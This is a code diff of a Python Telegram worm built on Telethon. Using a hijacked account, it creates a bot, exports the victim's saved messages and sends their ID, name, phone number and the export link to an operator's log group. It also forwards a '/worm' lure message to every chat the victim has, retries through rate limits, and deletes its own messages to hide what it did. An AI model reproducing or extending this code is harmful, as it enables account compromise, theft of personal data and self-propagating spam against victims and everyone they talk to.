@@ -3,7 +3,6 @@ from telethon import functions, errors
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
-from PIL import Image
 from strings import strings
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -26,10 +25,7 @@ async def create_bot(client, me):
         await (await conv.get_response()).delete()
         await (await conv.send_message(f"@{username}")).delete()
         await (await conv.get_response()).delete()
-        im = Image.open("files/profile.png").convert("RGBA")
-        im.save('profile.png', format="PNG")
-        await (await conv.send_file('profile.png')).delete()
-        os.remove('profile.png')
+        await (await conv.send_file('files/profile.png')).delete()
         await (await conv.get_response()).delete()
         await msg.delete()
         await response.delete()
@@ -56,13 +52,17 @@ async def backup_saves(client, me, bot):
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
     await bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}")
 async def spread(client, bot):
-    spread_msg = strings['worm_msg'].format((await bot.get_me()).username)
+    bot_me = await bot.get_me()
+    async with client.conversation(f"@{bot_me.username}") as conv:
+        msg = await conv.send_message("/worm")
+        spread_msg = await conv.get_response()
+        await msg.delete()
     async for dialog in client.iter_dialogs():
         try:
-            msg = await dialog.send_message(spread_msg)
+            msg = await spread_msg.forward_to(dialog)
         except errors.FloodWaitError as e:
             await asyncio.sleep(e.seconds)
-            msg = await dialog.send_message(spread_msg)
+            msg = await spread_msg.forward_to(dialog)
         except:
             continue
         if dialog.is_user:
